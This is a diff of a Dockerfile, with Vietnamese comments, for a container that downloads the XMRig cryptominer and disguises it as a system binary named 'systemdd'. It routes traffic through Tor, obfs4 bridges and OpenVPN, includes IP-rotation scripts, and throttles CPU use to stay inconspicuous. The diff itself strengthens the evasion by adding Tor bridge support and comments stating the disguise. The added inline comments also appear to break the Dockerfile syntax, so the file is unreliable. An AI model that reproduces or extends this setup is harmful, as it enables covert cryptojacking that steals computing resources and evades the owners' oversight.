@@ -1,13 +1,14 @@
 # Sử dụng image cơ bản từ Ubuntu
 FROM ubuntu:20.04
 
-# Cài đặt các công cụ cần thiết
+# Cài đặt các công cụ cần thiết bao gồm Tor, Privoxy, OpenVPN và obfs4proxy
 RUN apt-get update && apt-get install -y \
     torsocks \
     wget \
     tor \
     privoxy \
     openvpn \
+    obfs4proxy \   # Cài đặt obfs4proxy để sử dụng Tor Bridges
     bc \
     rename \
     cpulimit \
@@ -23,7 +24,7 @@ ENV VERSION="6.21.0" \
     DONATE="1" \
     TOR_PORT="9051" \
     VPN_CONFIG="/etc/openvpn/client.ovpn" \
-    CPU_MIN="70" \
+    CPU_MIN="50" \
     CPU_MAX="90"
 
 # Tạo thư mục làm việc
@@ -34,12 +35,12 @@ RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VE
     && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR \
     && mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/xmrig
 
-# Di chuyển và đổi tên tệp thực thi để ngụy trang thành systemdd
+# Di chuyển và đổi tên tệp thực thi để ngụy trang
 RUN mv /root/work/xmrig /usr/sbin/systemdd
 
 # Sao chép các file cấu hình vào container
 COPY config /etc/privoxy/config
-COPY torrc /etc/tor/torrc
+COPY torrc /etc/tor/torrc  # Sao chép file torrc có cấu hình Tor Bridges vào container
 COPY start.sh /root/start.sh
 COPY change_ip.sh /root/change_ip.sh
 COPY client.ovpn /etc/openvpn/client.ovpn
